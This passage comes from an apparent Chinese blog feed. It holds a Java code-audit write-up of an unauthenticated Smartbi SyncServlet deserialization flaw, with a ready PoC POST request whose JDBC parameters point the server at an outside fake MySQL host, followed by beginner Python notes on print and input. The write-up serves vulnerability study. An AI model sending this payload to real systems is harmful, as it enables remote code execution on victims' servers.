class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">POST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/smartbi/vision/SyncServlet</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP/1.1</span></span><span class="line"><span style="color: #61AFEF">Host:127.0.0.1:18080</span></span><span class="line"><span style="color: #61AFEF">User-Agent:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mozilla/5.0</span><span style="color: #ABB2BF"> (Windows </span><span style="color: #98C379">NT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.0</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Win64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">x64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">rv:136.0</span><span style="color: #ABB2BF">) Gecko/20100101 Firefox/136.0</span></span><span class="line"><span style="color: #61AFEF">Content-Type:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">application/x-www-form-urlencoded</span></span><span class="line"><span style="color: #61AFEF">Accept-Encoding:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">gzip</span></span><span class="line"><span style="color: #61AFEF">Content-Length:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">139</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">type</span><span style="color: #56B6C2">=</span><span style="color: #98C379">sqldictsync</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">dbNameOnly</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">dbType</span><span style="color: #56B6C2">=</span><span style="color: #98C379">MYSQL</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">dbServer</span><span style="color: #56B6C2">=</span><span style="color: #98C379">xxx.xxx.xxx.xxx:330</span></span><span class="line"><span style="color: #61AFEF">8</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">dbName</span><span style="color: #56B6C2">=</span><span style="color: #98C379">dec03db?detectCustomCollations=</span><span style="color: #D19A66">true</span><span style="color: #98C379">%26autoDeserialize=yes</span></span></code></pre></div></div></figure><p>通过JavaChains起⼀个fakeMysql服务器，发送Poc让smartBi服务器连接fakeMysql，即可触发反序列 化漏洞</p><p>直接弹出计算器</p><h4 id="漏洞分析：-4"><a href="#漏洞分析：-4" class="headerlink" title="漏洞分析："></a><strong>漏洞分析：</strong></h4><ol><li><p>查看web.xml⽂件， SyncServlet 配置到了 &#x2F;vision&#x2F;SyncServlet 路径下，且经过查看，并没 有配置检查是否登录的过滤器，因此访问该路径不需要登录</p><figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">servlet&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">servlet-name</span><span style="color: #ABB2BF">&gt;SyncServlet&lt;/</span><span style="color: #E06C75">servlet-name</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">servlet-class</span><span style="color: #ABB2BF">&gt;smartbi.freequery.sync.SyncServlet&lt;/</span><span style="color: #E06C75">servlet-class</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">servlet</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">servlet-mapping</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">servlet-name</span><span style="color: #ABB2BF">&gt;SyncServlet&lt;/</span><span style="color: #E06C75">servlet-name</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">url-pattern</span><span style="color: #ABB2BF">&gt;/vision/SyncServlet&lt;/</span><span style="color: #E06C75">url-pattern</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">servlet-mapping</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure></li><li><p>在 SyncServlet 的 doPost ⽅法中， (new SyncResources()).synchronize(type, dbSe rver, clientId, dbUser, fieldName, querySql) 中将接受的参数传⼊ synchronize 中</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173531532.png" alt="image-20250812185324525"></p></li><li><p>跟进synchronize </p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">synchronize</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbType</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbServer</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbName</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbUser</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbPass</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> querySql) throws Exception {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Connection</span><span style="color: #E06C75"> conn </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">DbUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getConnection</span><span style="color: #ABB2BF">(dbType, dbServer, dbName, dbUser, dbPass, (String)</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//跟进</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (conn </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">throw</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">IllegalArgumentException</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getLanguageValue</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Incomingconnectionparametererrorestablishconnectionfailed&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> colsCount </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">8</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">Reader</span><span style="color: #E06C75"> reader </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ResultSetReader</span><span style="color: #E06C75">(conn</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> querySql</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> colsCount)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">DictTree</span><span style="color: #E06C75"> tree </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">DictTree</span><span style="color: #E06C75">(reader)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doSynchronize</span><span style="color: #ABB2BF">(tree);</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure></li><li><p>跟进 DbUtil.getConnection(…) 中</p><p>主要有以下三个部分 ：</p><p>检查是否⽀持 dbType 类型的数据库连接</p><p>根据传⼊参数，拼接数据库连接源</p><p>配置信息，进⾏连接</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Connection</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getConnection</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbType</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbServer</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbName</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbUser</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> dbPass</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> connName) throws Exception {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">DBType</span><span style="color: #E06C75"> driverType </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">            driverType </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">DBType</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">valueOf</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">dbType</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toUpperCase</span><span style="color: #ABB2BF">());</span><span style="color: #7F848E; font-style: italic">//判断dbType手机都在数据库类型表中</span></span><span class="line"><span style="color: #E06C75">        } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">var9</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[] drvInfo </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">translateDriverInfo</span><span style="color: #E06C75">(driverType</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> dbServer</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> dbName)</span><span style="color: #ABB2BF">;</span><span style="color: #7F848E; font-style: italic">//通过传入的参数进行url拼接</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (drvInfo </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">DefaultConnectionInfo</span><span style="color: #E06C75"> info </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">DefaultConnectionInfo</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">info</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setId</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UUIDGenerator</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">generate</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">info</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setName</span><span style="color: #ABB2BF">(connName);</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">info</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDriverType</span><span style="color: #ABB2BF">(driverType);</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">info</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDriver</span><span style="color: #ABB2BF">(drvInfo[</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">]);</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">info</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setUrl</span><span style="color: #ABB2BF">(drvInfo[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">]);</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">info</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setUser</span><span style="color: #ABB2BF">(dbUser);</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">info</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setPassword</span><span style="color: #ABB2BF">(dbPass);</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ConnectionPool</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getConnection</span><span style="color: #ABB2BF">(info);</span></span><span class="line"><span style="color: #E06C75">        }</span><span style="color: #7F848E; font-style: italic">//配置数据库连接信息，并且进行连接</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure></li><li><p>最重要的部分在第⼆块，拼接恶意的数据库连接源</p><p>serverName设置为我们的fakemysql服务器，dbName根据mysql-connection的版本进⾏配置（这⾥为 5.1.44版本）</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">jdbc:mysql://xxx.xxx.xxx.xxx:3306/jdbcdec03db?detectCustomCollations=true%2</span></span><span class="line"><span style="color: #abb2bf">6autoDeserialize=yes</span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173534696.png" alt="image-20250812190104269"></p></li><li><p>根据doPost⽅法中接受参数名，构造poc即可（注意&amp;需要进⾏URL编码）</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">type=sqldictsync&amp;dbNameOnly=false&amp;dbType=MYSQL&amp;dbServer=101.36.122.13:3308&amp;</span></span><span class="line"><span style="color: #abb2bf">dbName=dec03db?detectCustomCollations=true%26autoDeserialize=yes</span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173537603.png" alt="image-20250812190132144"></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python学习笔记</title>
    <link href="/2025/10/27/P%20y%20t%20h%20o%20n%20%E5%AD%A6%20%E4%B9%A0%20%E7%AC%94%20%E8%AE%B0/"/>
    <url>/2025/10/27/P%20y%20t%20h%20o%20n%20%E5%AD%A6%20%E4%B9%A0%20%E7%AC%94%20%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="第一章-软件的安装"><a href="#第一章-软件的安装" class="headerlink" title="第一章 软件的安装"></a>第一章 软件的安装</h1><h2 id="1-本章目标"><a href="#1-本章目标" class="headerlink" title="1.本章目标"></a>1.本章目标</h2><ul><li>掌握Python解释器的安装与卸载</li><li>掌握PyCharm的安装与卸载</li></ul><p>Python解释器是一款用于解释、执行Python代码的应用程序</p><h2 id="2-Pycharm的简介"><a href="#2-Pycharm的简介" class="headerlink" title="2.Pycharm的简介"></a>2.Pycharm的简介</h2><p>PyCharm是一款Python的集成开发环境，在Windows、MacOS和Linux操作系统中都可以使用带有一整 套可以帮助用户在使用Python语言开发时提高效率的工具</p><h2 id="3-Pycharm的优势"><a href="#3-Pycharm的优势" class="headerlink" title="3.Pycharm的优势"></a>3.Pycharm的优势</h2><p>语法高亮、智能提示、代码调试、Project管理、解释代码、框架和库 … …</p><h2 id="4-Pycharm的版本"><a href="#4-Pycharm的版本" class="headerlink" title="4.Pycharm的版本"></a>4.Pycharm的版本</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170347164.png" alt="image-20251024135554162"></p><h1 id="第二章-Python编程基础"><a href="#第二章-Python编程基础" class="headerlink" title="第二章 Python编程基础"></a>第二章 Python编程基础</h1><h2 id="本章目标"><a href="#本章目标" class="headerlink" title="本章目标"></a>本章目标</h2><ul><li>了解什么是计算机程序 </li><li>了解什么是编程语言 </li><li>了解编程语言的分类 </li><li>了解静态语言与脚本语言的区别 </li><li>掌握IPO程序编写方法 </li><li>熟练应用输出函数print与输入函数input </li><li>掌握Python中的注释与缩进</li></ul><h2 id="程序设计语言"><a href="#程序设计语言" class="headerlink" title="程序设计语言"></a>程序设计语言</h2><h3 id="1-机器语言"><a href="#1-机器语言" class="headerlink" title="1.机器语言"></a>1.机器语言</h3><p>是一种 二进制语言，它直接使用二进制代码表达指令，是计算机硬件可以识别和执行的程序设计语言</p><h3 id="2-汇编语言"><a href="#2-汇编语言" class="headerlink" title="2.汇编语言"></a>2.汇编语言</h3><p>使用方便助记符与机器语言中的指令一一对应</p><h3 id="3-高级语言"><a href="#3-高级语言" class="headerlink" title="3.高级语言"></a>3.高级语言</h3><p>是接近自然语言的一种计算机程序设计语言，Python、Java都是高级语言</p><h2 id="编译与解释"><a href="#编译与解释" class="headerlink" title="编译与解释"></a>编译与解释</h2><h3 id="1-编译型"><a href="#1-编译型" class="headerlink" title="1.编译型"></a>1.编译型</h3><p>编译型是指将源代码转换成目标代码的过程，通常源代码是高级语言代码，目标代码是机器语言代码， 执行编译的计算机程序称为编译器（Complier）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170350328.png" alt="image-20251024135748021"></p><h3 id="2-解释型"><a href="#2-解释型" class="headerlink" title="2.解释型"></a>2.解释型</h3><p>解释型是将源代码逐行转换成目标代码的过程，执行解释的计算机程序称为解释器（Interpreter）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170351861.png" alt="image-20251024135811296"></p><h2 id="1-IPO程序编写法"><a href="#1-IPO程序编写法" class="headerlink" title="1. ＩＰＯ程序编写法"></a>1. ＩＰＯ程序编写法</h2><p>IPO（Input，Process，Output）</p><p> 输入–&gt;处理（process）–&gt;输出</p><h2 id="2-基本的输出函数print"><a href="#2-基本的输出函数print" class="headerlink" title="2. 基本的输出函数print"></a>2. 基本的输出函数print</h2><h3 id="语法结构："><a href="#语法结构：" class="headerlink" title="语法结构："></a>语法结构：</h3><p>print（输出内容）</p><h3 id="print-函数完整的语法格式："><a href="#print-函数完整的语法格式：" class="headerlink" title="print()函数完整的语法格式："></a>print()函数完整的语法格式：</h3><p>  print（ value，…，sep&#x3D;’ ‘，end&#x3D;’\n’, file&#x3D;None ）</p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">#demo 1</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;Hello Python!&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 示例2-1用print函数进行简单输出</span></span><span class="line"><span style="color: #ABB2BF">a </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">100</span></span><span class="line"><span style="color: #ABB2BF">b </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">50</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">90</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(a)</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(a </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> b)</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;北京欢迎你！&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;北京欢迎你！&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;&#39;&#39;北京欢迎你!&#39;&#39;&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;&quot;&quot;北京欢迎你！&quot;&quot;&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 示例2-2不换行一次输出多个数据</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(a, b, </span><span style="color: #98C379">&#39;要么出众，要么出局！！！&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 示例2-3输出ASCII表所对应的字符</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;b&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">chr</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">98</span><span style="color: #ABB2BF">))</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;C&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">chr</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">67</span><span style="color: #ABB2BF">))</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">8</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">chr</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">56</span><span style="color: #ABB2BF">))</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;[&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">chr</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">91</span><span style="color: #ABB2BF">))</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 示例2-4使用print函数输出中文Unicode码</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">ord</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;北&#39;</span><span style="color: #ABB2BF">))</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">ord</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;京&#39;</span><span style="color: #ABB2BF">))</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">chr</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">21271</span><span style="color: #ABB2BF">), </span><span style="color: #56B6C2">chr</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">20140</span><span style="color: #ABB2BF">))</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 示例2-5使用print函数将内容输出到文件</span></span><span class="line"><span style="color: #ABB2BF">fp </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">open</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;note.txt&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;w&#39;</span><span style="color: #ABB2BF">)  </span><span style="color: #7F848E; font-style: italic"># 打开文件 w--&gt;write</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;北京欢迎你&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75; font-style: italic">file</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">fp)  </span><span style="color: #7F848E; font-style: italic"># 将“北京欢迎你”输出（写入）到note.txt文件中</span></span><span class="line"><span style="color: #ABB2BF">fp.</span><span style="color: #61AFEF">close</span><span style="color: #ABB2BF">()  </span><span style="color: #7F848E; font-style: italic"># 关闭文件</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 示例2-6多条print函数输出结果一行显示</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;北京&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75; font-style: italic">end</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&#39;--&gt;&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;欢迎你&#39;</span><span style="color: #ABB2BF">)  </span><span style="color: #7F848E; font-style: italic"># 没有修改 结束符，所以print之后会有一个空行</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 示例2-7使用连接符连接多个字符串</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;北京欢迎你&#39;</span><span style="color: #56B6C2">+</span><span style="color: #98C379">&#39;2023&#39;</span><span style="color: #ABB2BF">)  </span><span style="color: #7F848E; font-style: italic"># 只能字符串与字符串连接</span></span></code></pre></div></div></figure><h2 id="3-基本的输入函数input"><a href="#3-基本的输入函数input" class="headerlink" title="3. 基本的输入函数input"></a>3. 基本的输入函数input</h2><h3 id="语法结构：-1"><a href="#语法结构：-1" class="headerlink" title="语法结构："></a>语法结构：</h3><p>  x&#x3D;input (‘提示文字’) </p><p>注意事项： 无论输入的数据是什么，x的数据类型都是<strong>字符串</strong>类型</p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 